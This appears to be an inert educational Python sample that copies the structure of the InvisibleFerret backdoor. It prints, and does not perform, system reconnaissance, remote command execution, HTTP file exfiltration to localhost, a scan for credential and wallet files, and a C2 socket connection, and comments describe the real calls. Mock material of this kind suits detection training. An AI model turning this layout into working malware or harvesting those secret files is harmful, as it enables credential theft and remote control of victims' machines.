# [FAKE-DEMO] This is an INERT educational sample — NOT real malware
# Mimics InvisibleFerret Python backdoor structure
# All network connections point to 127.0.0.1, all actions are print() only

import socket
import platform
import getpass
import subprocess
import os
import json

C2_HOST = '127.0.0.1'
C2_PORT = 1224
EXFIL_PATH = '.n2/pay'

def get_system_info():
    """[FAKE-DEMO] Collect system reconnaissance data"""
    info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'release': platform.release(),
        'arch': platform.machine(),
        'user': getpass.getuser(),
        'uname': str(platform.uname()),
    }
    print(f'[FAKE-DEMO] System info: {json.dumps(info, indent=2)}')
    return info

def exec_cmd(cmd):
    """[FAKE-DEMO] Would execute remote command"""
    print(f'[FAKE-DEMO] Would run: subprocess.Popen("{cmd[:50]}")')
    # Real ferret: subprocess.Popen(cmd, shell=True)

def upload_file(filepath):
    """[FAKE-DEMO] Would exfiltrate file via HTTP POST"""
    print(f'[FAKE-DEMO] Would upload: requests.post("http://127.0.0.1:9999/upload", files={{"{filepath}"}})')

def scan_for_secrets():
    """[FAKE-DEMO] Search for credential files"""
    patterns = ['.env', 'wallet.json', 'mnemonic.txt', '*.kdbx', 'id_rsa']
    print(f'[FAKE-DEMO] Would scan for: {patterns}')
    # Real ferret: os.walk() with these patterns, then upload matches

def connect_c2():
    """[FAKE-DEMO] Establish C2 connection"""
    print(f'[FAKE-DEMO] Would connect: socket.connect(("{C2_HOST}", {C2_PORT}))')
    # Real ferret: s = socket.socket(); s.connect((C2_HOST, C2_PORT))

def main():
    print('[FAKE-DEMO] InvisibleFerret sample loaded — this is NOT real malware')
    info = get_system_info()
    connect_c2()
    scan_for_secrets()

if __name__ == '__main__':
    main()
